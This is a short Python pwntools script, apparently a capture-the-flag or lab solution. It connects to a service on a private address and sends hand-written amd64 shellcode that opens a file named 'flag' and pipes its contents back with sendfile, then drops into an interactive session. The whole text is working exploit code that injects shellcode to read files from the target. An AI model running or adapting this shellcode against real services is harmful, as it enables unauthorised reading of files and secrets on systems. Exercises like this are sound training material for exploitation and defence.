from pwn import *

context.arch = "amd64"


p = remote("192.168.191.128", 5000)

shellcode = asm(f"""
push   0x67616c66
push   0x2
pop    rax
push rsp
pop rdi
xor    esi, esi
syscall

mov    r10d, 0x7fffffff
push rax
pop rsi
push   0x28
pop    rax
push   0x2
pop    rdi
cdq    
syscall
""")

assert type(shellcode) == bytes, "You should send bytes to the binary. Have you remembered to assemble?"

p.readrepeat(1)
p.send(shellcode)

p.interactive()
